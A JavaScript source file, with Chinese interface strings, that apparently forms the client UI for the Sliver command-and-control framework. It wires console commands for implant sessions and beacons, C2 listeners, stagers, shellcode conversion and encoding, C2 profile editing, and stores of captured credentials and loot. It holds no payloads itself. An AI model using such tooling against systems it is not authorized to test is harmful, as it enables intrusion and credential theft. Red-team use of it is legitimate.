    'builds','regenerate','profiles','websites','website','canaries','stager','use','c2profiles','c2profile',
    'certificates','certs','ca','compiler','compiler-info','builders','traffic-encoders','shellcode-encoders',
    'armory','restart-jobs','monitor','pivots','pivot-graph','wg-client-config','wg-unique-ip','dll2shellcode',
    'srdi','shellcode-encode','rename','kill-session','rm-session','kill-beacon','rm-beacon','mtls','http','https',
    'dns','wg','wireguard',
  ],
  arguments: {
    jobs: { 0: ['kill'] }, loot: { 0: ['rm','rename'] }, hosts: { 0: ['rm','ioc-rm'] },
    creds: { 0: ['add','rm','update','sniff','get'] }, websites: { 0: ['rm'] },
    website: { 0: ['add','update','rm'] }, c2profile: { 0: ['edit','new'] },
    armory: { 0: ['install','remove'] }, monitor: { 0: ['start','stop','list','add','del'] },
  },
};

function serverDynamicCompletions({ command, token }) {
  if (token.index !== 1) return [];
  if (['use','kill-session','rm-session','rename'].includes(command)) return allSessions.map(item => item.id);
  if (['use','kill-beacon','rm-beacon'].includes(command)) return allBeacons.map(item => item.id);
  return [];
}

function pinServerConsole() {
  const id = '_server_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>服务器</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div class="console-out" id="sc-out"><span class="info">Sliver 服务器控制台 - 输入 'help' 查看帮助。这里的命令在团队服务器上运行。\n</span></div>
    <div class="console-in"><span class="console-prompt">sliver &gt; </span><input class="console-input" id="sc-inp" placeholder="输入服务器命令..." autocomplete="off"/></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  const inp = document.getElementById('sc-inp');
  const hist = []; let hi = -1;
  attachCommandCompletion(inp, SERVER_COMMAND_SCHEMA, serverDynamicCompletions);
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') { const v = inp.value.trim(); inp.value = ''; hi = -1; if (v) { hist.unshift(v); runServerCmd(v); } }
    if (e.key === 'ArrowUp') { if (hi < hist.length-1) { hi++; inp.value = hist[hi]; } e.preventDefault(); }
    if (e.key === 'ArrowDown') { if (hi > 0) { hi--; inp.value = hist[hi]; } else { hi = -1; inp.value = ''; } e.preventDefault(); }
  });
  activateTab(id);
}
function appendServer(text, cls) {
  const o = document.getElementById('sc-out'); if (!o) return;
  const s = document.createElement('span'); s.className = cls || 'out'; s.textContent = text + '\n';
  o.appendChild(s); o.scrollTop = o.scrollHeight;
}
async function installArmoryPackage(packageName) {
  const installTask = taskStore.create({
    type: 'armory-install', title: '安装 Armory 包', target: packageName,
    status: 'running', summary: '正在获取并安装软件包', timeoutMs: 120000,
    policy: '使用 Sliver 官方 Armory 索引；网络请求最长等待 120 秒并自动重试；安装过程暂不支持取消。',
  });
  taskActions.set(installTask.id, { retry: () => installArmoryPackage(packageName) });
  appendServer(`[*] 正在安装 ${packageName}...`, 'info');
  const error = await App().ArmoryInstall(packageName).then(() => null).catch(error => error);
  if (error) {
    const message = rpcErrorMessage(error, 'Armory 安装失败');
    const safeMessage = RpcErrors.safeRpcErrorMessage(error, 'Armory 安装失败');
    taskStore.update(installTask.id, { status: 'failed', canRetry: true, summary: safeMessage, error: safeMessage });
    appendServer(`[错误] ${message}`, 'err');
    return;
  }
  taskActions.delete(installTask.id);
  taskStore.update(installTask.id, { status: 'success', summary: '软件包安装完成' });
  appendServer(`[成功] ${packageName} 已安装`, 'out');
}
async function runServerCmd(raw) {
  const parts = tok(raw), cmd = (parts[0]||'').toLowerCase(), args = parts.slice(1);
  appendServer(raw, 'cmd');
  try {
    switch (cmd) {
      case 'help': return appendServer(SERVER_HELP, 'info');
      case 'clear': { const o = document.getElementById('sc-out'); if (o) o.innerHTML = ''; return; }
      case 'version': { const v = await App().GetVersion(); return appendServer(`Sliver v${v.major}.${v.minor}.${v.patch}  ${v.os}/${v.arch}  (${v.compiled||''})`, 'out'); }
      case 'sessions': {
        const s = await App().ListSessions(); if (!s.length) return appendServer('no sessions', 'info');
        let o = 'ID           HOST                 USER                 OS/ARCH\n';
        s.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${x.os}/${x.arch}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'beacons': {
        const b = await App().ListBeacons(); if (!b.length) return appendServer('no beacons', 'info');
        let o = 'ID           HOST                 USER                 INTERVAL\n';
        b.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${fmtDur(x.interval)}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'jobs': case 'listeners': {
        if (args[0] === 'kill') { if (!args[1]) return appendServer('usage: jobs kill <id>', 'err'); if (!(await uiConfirm(`确定终止 Job ${esc(args[1])} 吗？`, { title:'终止 Job', okLabel:'终止', danger:true }))) return; await App().KillJob(parseInt(args[1])); return appendServer(`[+] job ${args[1]} killed`, 'out'); }
        const j = await App().ListJobs(); if (!j.length) return appendServer('no active jobs', 'info');
        let o = 'ID    NAME       PROTO   PORT\n';
        j.forEach(x => o += `${String(x.id).padEnd(6)}${(x.name||'').padEnd(11)}${(x.protocol||'').padEnd(8)}${x.port||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'operators': case 'players': {
        const ops = await App().ListOperators(); if (!ops.length) return appendServer('no operators', 'info');
        return appendServer(ops.map(o => `${o.online?'[online] ':'[offline]'} ${o.name}`).join('\n'), 'out');
      }
      case 'loot': {
        if (args[0] === 'rm') { if (!args[1]) return appendServer('usage: loot rm <id>', 'err'); if (!(await uiConfirm(`确定删除战利品 ${esc(args[1])} 吗？`, { title:'删除战利品', okLabel:'删除', danger:true }))) return; await App().DeleteLoot(args[1]); return appendServer(`[+] loot ${args[1]} removed`, 'out'); }
        if (args[0] === 'rename') { if (args.length < 3) return appendServer('usage: loot rename <id> <new-name>', 'err'); await App().RenameLoot(args[1], args.slice(2).join(' ')); return appendServer('[+] loot renamed', 'out'); }
        const l = await App().GetLoot(); if (!l.length) return appendServer('loot store empty', 'info');
        return appendServer(l.map(x => `${x.id.slice(0,12)}  ${(x.type||'').padEnd(10)} ${x.name}`).join('\n'), 'out');
      }
      case 'builds': { const b = await App().GetBuildHistory(); if (!b.length) return appendServer('no builds', 'info'); return appendServer(b.map(x => `${(x.name||'').padEnd(24)} ${x.goos}/${x.goarch} ${x.format}`).join('\n'), 'out'); }
      case 'profiles': { const p = await App().ListImplantProfiles(); if (!p.length) return appendServer('no profiles', 'info'); return appendServer(p.map(x => `${(x.name||'').padEnd(20)} ${x.goos}/${x.goarch} ${x.c2Url||''}`).join('\n'), 'out'); }
      case 'use': {
        if (!args[0]) return appendServer('usage: use <id-prefix>', 'err');
        const all = [...allSessions.map(s => ({kind:'session',obj:s})), ...allBeacons.map(b => ({kind:'beacon',obj:b}))];
        const m = all.find(a => a.obj.id.startsWith(args[0]));
        if (!m) return appendServer(`no session/beacon matching ${args[0]}`, 'err');
        openInteract(m.kind, m.obj); return appendServer(`[+] interacting with ${m.obj.hostname}`, 'out');
      }
      case 'mtls': { await App().StartMTLSListener({host:'0.0.0.0',port:parseInt(args[0])||8443}); return appendServer(`[+] mTLS listener started on :${parseInt(args[0])||8443}`, 'out'); }
      case 'http': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||80,secure:false}); return appendServer(`[+] HTTP listener started on :${parseInt(args[0])||80}`, 'out'); }
      case 'https': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||443,secure:true}); return appendServer(`[+] HTTPS listener started on :${parseInt(args[0])||443}`, 'out'); }
      case 'dns': { if (!args.length) return appendServer('usage: dns <domain...>', 'err'); await App().StartDNSListener({domains:args}); return appendServer(`[+] DNS listener for ${args.join(', ')}`, 'out'); }
      case 'wg': case 'wireguard': { await App().StartWGListener({port:parseInt(args[0])||53,nPort:parseInt(args[1])||8888,keyPort:parseInt(args[2])||1337}); return appendServer(`[+] WireGuard listener started`, 'out'); }
      case 'kill-session': case 'rm-session': { if (!args[0]) return appendServer('usage: kill-session <id-prefix>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); if (!(await uiConfirm(`确定终止 ${esc(s.hostname || s.id)} 上的会话吗？`, { title:'终止会话', okLabel:'终止', danger:true }))) return; await App().KillSession(s.id); return appendServer(`[+] killed session ${s.hostname}`, 'out'); }
      case 'kill-beacon': case 'rm-beacon': { if (!args[0]) return appendServer('usage: kill-beacon <id-prefix>', 'err'); const b = allBeacons.find(x => x.id.startsWith(args[0])); if (!b) return appendServer('no matching beacon', 'err'); if (!(await uiConfirm(`确定终止 ${esc(b.hostname || b.id)} 上的信标吗？`, { title:'终止信标', okLabel:'终止', danger:true }))) return; await App().KillBeacon(b.id); return appendServer(`[+] removed beacon ${b.hostname}`, 'out'); }
      case 'rename': { if (args.length < 2) return appendServer('usage: rename <session-id-prefix> <new-name>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().RenameSession(s.id, args.slice(1).join(' ')); refreshAgents(); return appendServer('[+] renamed', 'out'); }
      case 'c2profiles': { const p = await App().ListC2Profiles(); if (!p.length) return appendServer('no HTTP C2 profiles', 'info'); return appendServer(p.map(x => x.name).join('\n'), 'out'); }
      case 'certificates': case 'certs': {
        const c = await App().ListCertificates(); if (!c.length) return appendServer('no certificates', 'info');
        let o = 'CN                             TYPE            KEYALG     EXPIRES\n';
        c.forEach(x => o += `${(x.cn||'').slice(0,30).padEnd(31)}${(x.type||'').padEnd(16)}${(x.keyAlgorithm||'').padEnd(11)}${x.validExpiry||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'compiler': case 'compiler-info': {
        const c = await App().GetCompilerInfo();
        let o = `server: ${c.goos}/${c.goarch}\ncross-compilers: ${(c.crossCompilers||[]).join(', ')||'none'}\ntargets:\n`;
        (c.targets||[]).forEach(t => o += `  ${t.goos}/${t.goarch} (${t.format})\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'builders': {
        const b = await App().ListBuilders(); if (!b.length) return appendServer('no external builders registered', 'info');
        return appendServer(b.map(x => `${(x.name||'').padEnd(20)} ${x.goos}/${x.goarch}  op=${x.operatorName}  [${x.templates}]`).join('\n'), 'out');
      }
      case 'traffic-encoders': { const t = await App().ListTrafficEncoders(); return appendServer(t.length ? t.join('\n') : 'no traffic encoders', t.length?'out':'info'); }
      case 'shellcode-encoders': { const s = await App().ListShellcodeEncoders(); return appendServer(s.length ? s.join('\n') : 'no shellcode encoders', s.length?'out':'info'); }
      case 'armory': {
        const sub = (args[0]||'').toLowerCase();
        if (sub === 'install') {
          if (!args[1]) return appendServer('用法：armory install <包名>', 'err');
          return installArmoryPackage(args[1]);
        }
        if (sub === 'remove' || sub === 'rm') {
          if (!args[1]) return appendServer('用法：armory remove <包名>', 'err');
          const error = await App().ArmoryRemove(args[1]).then(() => null).catch(error => error);
          return appendServer(error ? `[错误] ${rpcErrorMessage(error, '移除 Armory 包失败')}` : `[成功] ${args[1]} 已移除`, error ? 'err' : 'out');
        }
        const pkgs = await App().ArmoryList().catch(error => { appendServer(`[错误] ${rpcErrorMessage(error, '加载 Armory 列表失败')}`, 'err'); return null; });
        if (!pkgs) return;
        if (!pkgs.length) return appendServer('暂无可用的 Armory 包', 'info');
        let out = `${'名称'.padEnd(28)}${'类型'.padEnd(11)}${'已安装'.padEnd(11)}说明
`;
        pkgs.forEach(p => { out += `${(p.name||'').slice(0,27).padEnd(28)}${(p.type === 'alias' ? '别名' : '扩展').padEnd(11)}${(p.installed?'是':'否').padEnd(11)}${(p.description||'').slice(0,50)}
`; });
        return appendServer(out.trimEnd(), 'out');
      }
      case 'restart-jobs': { if (!args.length) return appendServer('usage: restart-jobs <id> [id...]', 'err'); await App().RestartJobs(args.map(a => parseInt(a))); return appendServer(`[+] restarted jobs ${args.join(', ')}`, 'out'); }
      case 'ca': case 'certificate-authority': {
        const c = await App().ListCAInfo(); if (!c.length) return appendServer('no CA certificates', 'info');
        let o = 'CN                             TYPE            KEYALG     EXPIRES\n';
        c.forEach(x => o += `${(x.cn||'').slice(0,30).padEnd(31)}${(x.type||'').padEnd(16)}${(x.keyAlgorithm||'').padEnd(11)}${x.validExpiry||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'monitor': {
        const sub = (args[0]||'list').toLowerCase();
        if (sub === 'start') { await App().StartMonitor(); return appendServer('[+] monitor started', 'out'); }
        if (sub === 'stop')  { await App().StopMonitor();  return appendServer('[+] monitor stopped', 'out'); }
        if (sub === 'add')   { if (args.length < 3) return appendServer('usage: monitor add <type> <apikey> [apipassword]', 'err'); await App().AddMonitorConfig(args[1], args[2], args[3]||''); return appendServer('[+] monitoring provider added', 'out'); }
        if (sub === 'del' || sub === 'rm') { if (!args[1]) return appendServer('usage: monitor del <id>', 'err'); await App().DelMonitorConfig(args[1]); return appendServer('[+] provider removed', 'out'); }
        const p = await App().ListMonitorConfig(); if (!p.length) return appendServer('no monitoring providers configured', 'info');
        return appendServer(p.map(x => `${(x.id||'').padEnd(16)} ${x.type}`).join('\n'), 'out');
      }
      case 'pivot-graph': case 'pivots': {
        const g = await App().GetPivotGraph(); if (!g.length) return appendServer('no pivots', 'info');
        const lines = []; const walk = (n, d) => { lines.push(`${'  '.repeat(d)}${n.hostname||n.name||('peer '+n.peerId)}`); (n.children||[]).forEach(c => walk(c, d+1)); };
        g.forEach(n => walk(n, 0)); return appendServer(lines.join('\n'), 'out');
      }
      case 'wg-client-config': {
        const c = await App().GenerateWGClientConfig();
        return appendServer(`ClientIP:         ${c.clientIP}\nClientPrivateKey: ${c.clientPrivateKey}\nClientPubKey:     ${c.clientPubKey}\nServerPubKey:     ${c.serverPubKey}`, 'out');
      }
      case 'wg-unique-ip': { const ip = await App().GenerateUniqueWGIP(); return appendServer(`[+] unique WG IP: ${ip}`, 'out'); }
      case 'dll2shellcode': case 'srdi': {
        if (args.length < 2) return appendServer('usage: dll2shellcode <local.dll> <function> [args]', 'err');
        const p = await App().ConvertDLLToShellcode(args[0], args[1], args.slice(2).join(' '));
        return appendServer(`[+] shellcode saved to ${p}`, 'out');
      }
      case 'shellcode-encode': {
        if (!args[0]) return appendServer('usage: shellcode-encode <local.bin> [arch=amd64] [iterations=1]', 'err');
        const p = await App().EncodeShellcode(args[0], args[1]||'amd64', parseInt(args[2])||1);
        return appendServer(`[+] encoded shellcode saved to ${p}`, 'out');
      }
      case 'c2profile': {
        if (args[0] === 'edit') { if (!args[1]) return appendServer('usage: c2profile edit <name>', 'err'); openC2Editor(args[1]); return appendServer(`[*] editing HTTP C2 profile ${args[1]}`, 'info'); }
        if (args[0] === 'new')  { openC2Editor(''); return appendServer('[*] new HTTP C2 profile editor opened', 'info'); }
        if (!args[0]) return appendServer('usage: c2profile <name> | edit <name> | new   (view/edit HTTP C2 profiles)', 'err');
        const j = await App().GetHTTPC2Profile(args[0]); return appendServer(j, 'out');
      }
      case 'website': {
        const sub = (args[0]||'').toLowerCase();
        if (sub === 'add') { if (args.length < 4) return appendServer('usage: website add <site> <web-path> <local-file>', 'err'); await App().AddWebsiteContent(args[1], args[2], args[3]); return appendServer('[+] content added', 'out'); }
        if (sub === 'update') { if (args.length < 4) return appendServer('usage: website update <site> <web-path> <local-file>', 'err'); await App().UpdateWebsiteContent(args[1], args[2], args[3]); return appendServer('[+] content updated', 'out'); }
        if (sub === 'rm')  { if (args.length < 3) return appendServer('usage: website rm <site> <web-path>', 'err'); if (!(await uiConfirm(`确定从网站“${esc(args[1])}”删除指定内容吗？`, { title:'删除网站内容', okLabel:'删除', danger:true }))) return; await App().RemoveWebsiteContent(args[1], args[2]); return appendServer('[+] content removed', 'out'); }
        const w = await App().ListWebsites(); if (!w || !w.length) return appendServer('no websites', 'info');
        return appendServer(w.map(x => x.name).join('\n'), 'out');
      }
      case 'hosts': {
        if (args[0] === 'rm') { if (!args[1]) return appendServer('usage: hosts rm <id>', 'err'); if (!(await uiConfirm(`确定删除主机记录 ${esc(args[1])} 吗？`, { title:'删除主机', okLabel:'删除', danger:true }))) return; await App().DeleteHost(args[1]); return appendServer(`[+] host ${args[1]} removed`, 'out'); }
        if (args[0] === 'ioc-rm') { if (!args[1]) return appendServer('usage: hosts ioc-rm <ioc-id> [path] [filehash]', 'err'); await App().RemoveHostIOC(args[1], args[2]||'', args[3]||''); return appendServer('[+] host IOC removed', 'out'); }
        const h = await App().ListHosts(); if (!h.length) return appendServer('no hosts in the database', 'info');
        let o = 'HOSTNAME             OS                             UUID\n';
        h.forEach(x => o += `${(x.hostname||'').slice(0,20).padEnd(21)}${(x.os||'').slice(0,30).padEnd(31)}${(x.uuid||'').slice(0,12)}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'creds': {
        if (args[0] === 'add') { if (args.length < 3) return appendServer('usage: creds add <username> <password>', 'err'); await App().AddCred(args[1], args[2], ''); return appendServer('[+] credential added', 'out'); }
        if (args[0] === 'rm') { if (!args[1]) return appendServer('usage: creds rm <id>', 'err'); if (!(await uiConfirm(`确定删除凭据记录 ${esc(args[1])} 吗？`, { title:'删除凭据', okLabel:'删除', danger:true }))) return; await App().DeleteCred(args[1]); return appendServer(`[+] credential ${args[1]} removed`, 'out'); }
        if (args[0] === 'update') { if (args.length < 3) return appendServer('usage: creds update <id> <plaintext>', 'err'); await App().UpdateCredential(args[1], '', args[2], '', true); return appendServer('[+] credential updated', 'out'); }
        if (args[0] === 'sniff') { if (!args[1]) return appendServer('usage: creds sniff <hash>', 'err'); const ht = await App().SniffCredHashType(args[1]); return appendServer(`hash type: ${ht}`, 'out'); }
        if (args[0] === 'get') { if (!args[1]) return appendServer('usage: creds get <id>', 'err'); const c = await App().GetCredential(args[1]); return appendServer(`ID:        ${c.id}\nUsername:  ${c.username}\nPlaintext: ${c.plaintext}\nHash:      ${c.hash}\nCracked:   ${c.cracked}`, 'out'); }
        const c = await App().ListCreds(); if (!c.length) return appendServer('no credentials stored', 'info');
        let o = 'USERNAME             PLAINTEXT / HASH\n';
        c.forEach(x => o += `${(x.username||'').slice(0,20).padEnd(21)}${x.plaintext || x.hash || ''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'regenerate': { if (!args[0]) return appendServer('usage: regenerate <build-name>', 'err'); const r = await App().RegenerateBuild(args[0]); return appendServer(r.error ? `[error] ${r.error}` : `[+] saved ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out'); }
      case 'websites': {
        if (args[0] === 'rm') { if (!args[1]) return appendServer('usage: websites rm <name>', 'err'); if (!(await uiConfirm(`确定删除网站“${esc(args[1])}”及其全部内容吗？`, { title:'删除网站', okLabel:'删除', danger:true }))) return; await App().RemoveWebsite(args[1]); return appendServer(`[+] website ${args[1]} removed`, 'out'); }
        const w = await App().ListWebsites(); if (!w.length) return appendServer('no websites', 'info');
        return appendServer(w.map(x => `${(x.name||'').padEnd(20)} ${x.paths} path(s)`).join('\n'), 'out');
      }
      case 'canaries': {
        const c = await App().ListCanaries(); if (!c.length) return appendServer('no canaries', 'info');
        let o = 'DOMAIN                         IMPLANT              TRIGGERED  COUNT\n';
        c.forEach(x => o += `${(x.domain||'').slice(0,30).padEnd(31)}${(x.implantName||'').slice(0,20).padEnd(21)}${(x.triggered?'YES':'no').padEnd(11)}${x.count}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'stager': {
        if (args.length < 3) return appendServer('usage: stager <host> <port> <profile>', 'err');
        const jid = await App().StartStagerListener(args[0], parseInt(args[1]), args[2]).catch(e => { appendServer(`[error] ${e}`, 'err'); return null; });
        if (jid !== null) return appendServer(`[+] TCP stager listener started on ${args[0]}:${args[1]} (job ${jid})`, 'out');
        return;
      }
      default: appendServer(`unknown server command: ${cmd}  (type 'help')`, 'err');
    }
  } catch (e) { appendServer('[error] ' + e, 'err'); }
}

function openEventsPanel() {
  const content = `<div style="display:flex;justify-content:flex-end;margin-bottom:8px"><button class="btn small" onclick="pinEvents()">固定到控制台</button></div><div class="event-log" data-events-list style="max-height:64vh"></div>`;
  openViewPanel('_events', '事件日志', content);
  renderEventsList();
}
// pinEvents docks a live Event Log panel into the bottom console area.
function pinEvents() {
  hideModal();
  const id = '_events_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>事件日志</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div class="event-log" data-events-list style="flex:1"></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  renderEventsList();
}

async function openOperatorsPanel() {
  const ops = await App().ListOperators().catch(() => []);
  let rows = (ops||[]).map(o => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;border-bottom:1px solid var(--border)"><span style="color:${o.online?'var(--ok)':'var(--muted)'}">${o.online?'[在线]':'[离线]'}</span><span>${esc(o.name)}</span></div>`).join('');
  if (!rows) rows = '<div style="padding:10px;color:var(--muted)">暂无操作员。</div>';
  openViewPanel('_operators', '操作员', `<div style="overflow:auto;flex:1">${rows}</div>`);
}

function openLootPanel() {
  openViewPanel('_loot', '战利品', `<div style="overflow:auto;flex:1" id="loot-list"><div style="padding:10px;color:var(--muted)">正在加载...</div></div>`);
  refreshLootList();
}

// HTTP C2 profile editor. Advanced JSON remains the source of truth; the basic
// form only merges fields it owns so unknown server options are preserved.
async function openC2Editor(name, initialJSON = '', onSaved = null) {
  openViewPanel('_c2edit', `HTTP C2 配置档案${name ? ' — ' + name : ''}`,
    `<div class="studio-stack">
       <div class="segmented" role="tablist"><button class="active" data-c2-mode="basic">常用设置</button><button data-c2-mode="json">高级 JSON</button></div>
       <div id="c2-basic" class="studio-section">
         <div class="gen-row"><div class="gen-field"><label>档案名称</label><input id="c2-name"/></div><div class="gen-field"><label>User-Agent</label><input id="c2-ua"/></div></div>
         <div class="gen-row"><div class="gen-field"><label>Chrome 基准版本</label><input id="c2-chrome" type="number" min="0"/></div><div class="gen-field"><label>macOS 版本</label><input id="c2-macos"/></div></div>
         <div class="gen-row"><div class="gen-field"><label>文件名长度（最小 / 最大）</label><div class="inline-pair"><input id="c2-minfile" type="number" min="0"/><input id="c2-maxfile" type="number" min="0"/></div></div><div class="gen-field"><label>路径长度（最小 / 最大）</label><div class="inline-pair"><input id="c2-minpath" type="number" min="0"/><input id="c2-maxpath" type="number" min="0"/></div></div></div>
         <div class="gen-row"><div class="gen-field"><label>扩展名（逗号分隔）</label><input id="c2-ext" placeholder="php, html"/></div><label class="check-label"><input id="c2-random-version" type="checkbox"/> 随机版本响应头</label></div>
         <p class="field-note">请求头、Cookie、路径段及未知字段保留在高级 JSON 中，不会因编辑常用设置而丢失。</p>
       </div>
       <textarea id="c2-json" class="notes-area hidden" style="flex:1;min-height:300px;font-family:var(--mono);font-size:11px;line-height:1.5" spellcheck="false">正在加载...</textarea>
       <div style="display:flex;gap:8px;align-items:center">
         <button id="c2-import" class="btn">导入 JSON</button>
         <button id="c2-validate" class="btn">模型校验</button>
         <button id="c2-save" class="btn accent">保存（覆盖）</button>
         <button id="c2-savenew" class="btn">另存为新档案</button>
         <span id="c2-status" style="font-size:11px;color:var(--muted)"></span>
       </div>
     </div>`);
  const ta = document.getElementById('c2-json'), status = document.getElementById('c2-status');
  const basic = document.getElementById('c2-basic');
  const parse = () => { try { return JSON.parse(ta.value || '{}'); } catch { return null; } };
  const fillBasic = cfg => {
    const implant = cfg?.ImplantConfig || {}, server = cfg?.ServerConfig || {};
    document.getElementById('c2-name').value = cfg?.Name || '';
    document.getElementById('c2-ua').value = implant.UserAgent || '';
    document.getElementById('c2-chrome').value = implant.ChromeBaseVersion || 0;
    document.getElementById('c2-macos').value = implant.MacOSVersion || '';
    document.getElementById('c2-minfile').value = implant.MinFileGen || 0;
    document.getElementById('c2-maxfile').value = implant.MaxFileGen || 0;
    document.getElementById('c2-minpath').value = implant.MinPathLength || 0;
    document.getElementById('c2-maxpath').value = implant.MaxPathLength || 0;
    document.getElementById('c2-ext').value = (implant.Extensions || []).join(', ');
    document.getElementById('c2-random-version').checked = !!server.RandomVersionHeaders;
  };
  const mergeBasic = () => {
    const cfg = parse(); if (!cfg) throw new Error('JSON 格式无效，请先修正高级 JSON');
    cfg.Name = document.getElementById('c2-name').value.trim();
    cfg.ServerConfig ||= {}; cfg.ImplantConfig ||= {};
    cfg.ServerConfig.RandomVersionHeaders = document.getElementById('c2-random-version').checked;
    Object.assign(cfg.ImplantConfig, {
      UserAgent: document.getElementById('c2-ua').value,
      ChromeBaseVersion: parseInt(document.getElementById('c2-chrome').value) || 0,
      MacOSVersion: document.getElementById('c2-macos').value,
      MinFileGen: parseInt(document.getElementById('c2-minfile').value) || 0,
      MaxFileGen: parseInt(document.getElementById('c2-maxfile').value) || 0,
      MinPathLength: parseInt(document.getElementById('c2-minpath').value) || 0,
      MaxPathLength: parseInt(document.getElementById('c2-maxpath').value) || 0,
      Extensions: document.getElementById('c2-ext').value.split(',').map(v=>v.trim()).filter(Boolean),
    });
    ta.value = JSON.stringify(cfg, null, 2); return cfg;
  };
  if (initialJSON) ta.value = initialJSON;
  else if (name) { try { ta.value = await App().GetHTTPC2Profile(name); } catch (e) { ta.value = '{}'; status.textContent = rpcErrorMessage(e, '加载配置档案失败'); } }
  else ta.value = JSON.stringify({Name:'',ServerConfig:{RandomVersionHeaders:true},ImplantConfig:{Extensions:[]}}, null, 2);
  fillBasic(parse());
  document.querySelectorAll('[data-c2-mode]').forEach(btn => btn.addEventListener('click', () => {
    try {
      if (btn.dataset.c2Mode === 'json') mergeBasic(); else fillBasic(parse());
      document.querySelectorAll('[data-c2-mode]').forEach(b=>b.classList.toggle('active', b===btn));
      basic.classList.toggle('hidden', btn.dataset.c2Mode !== 'basic'); ta.classList.toggle('hidden', btn.dataset.c2Mode !== 'json'); status.textContent = '';
    } catch(e) { status.textContent = e.message; }
  }));
  document.getElementById('c2-import').addEventListener('click', async () => {
    const imported = await App().ImportHTTPC2ProfileFile().catch(error => ({ error }));
    if (!imported || imported.error) {
      if (imported?.error) status.textContent = rpcErrorMessage(imported.error, '导入失败');
      return;
    }
    ta.value = imported; fillBasic(parse()); status.textContent = '已导入，尚未保存到 Teamserver'; status.style.color='var(--info)';
  });
  document.getElementById('c2-validate').addEventListener('click', async () => {
    try {
      mergeBasic(); status.textContent = '正在按 Sliver 模型校验...';
      const result = await App().ValidateHTTPC2Profile(ta.value);
      status.textContent = `模型校验通过：${result.name}`; status.style.color='var(--ok)';
    } catch(e) { status.textContent=rpcErrorMessage(e, '模型校验失败'); status.style.color='var(--danger)'; }
  });
  const save = async overwrite => {
    try { mergeBasic(); } catch(e) { status.textContent=e.message; return; }
    if (!ta.value.trim()) { status.textContent = '没有可保存的内容'; return; }
    status.textContent = '正在保存...';
    try { await App().SaveHTTPC2Profile(ta.value, overwrite); status.textContent = '已保存'; toast('ok', 'HTTP C2 配置档案已保存'); if (onSaved) await onSaved(parse()?.Name || ''); }
    catch (e) { status.textContent = rpcErrorMessage(e, '保存失败'); toastRpcError(e, '保存 C2 配置档案失败'); }
  };
  document.getElementById('c2-save').addEventListener('click', () => save(true));
  document.getElementById('c2-savenew').addEventListener('click', () => save(false));
}
async function refreshLootList() {
  const el = document.getElementById('loot-list'); if (!el) return;
  const loot = await App().GetLoot().catch(() => []);
  if (!loot?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">暂无战利品。</div>'; return; }
  el.innerHTML = loot.map(l => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(l.name)}</span><span style="color:var(--muted)">${esc(l.type)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(l.id.slice(0,10))}</span><button class="btn small" onclick="lootDownload('${esc(l.id)}')">下载</button><button class="btn small danger" onclick="deleteLoot('${esc(l.id)}', '${esc(l.name)}')">删除</button></div>`).join('');
}
function deleteLoot(id, name) {
  return runDangerousAction({ title:'删除战利品', message:`确定永久删除“${esc(name)}”吗？`, okLabel:'删除', action:()=>App().DeleteLoot(id), success:'战利品已删除', refresh:refreshLootList });
}
async function lootDownload(lootID) {
  const r = await App().DownloadLoot(lootID).catch(error => ({ error }));
  if (r.error) toastRpcError(r.error, '战利品下载失败');
  else toast('ok', `已保存到 ${r.path}`);
}

// ── Creds panel ─────────────────────────────────────────────────────────────
function openCredsPanel() {
  const content = `<div class="panel" style="margin-bottom:12px"><h3>添加凭据</h3>
    <form id="cred-form">
      <div class="gen-row">
        <div class="gen-field"><label>用户名</label><input name="username" placeholder="user"/></div>
        <div class="gen-field"><label>密码 / 明文</label><input name="plaintext" placeholder="P@ss"/></div>
        <div class="gen-field"><label>哈希（可选）</label><input name="hash" placeholder="NTLM/hash"/></div>
      </div>
      <div class="gen-row"><button type="submit" class="btn accent" style="margin-left:auto">添加</button></div>
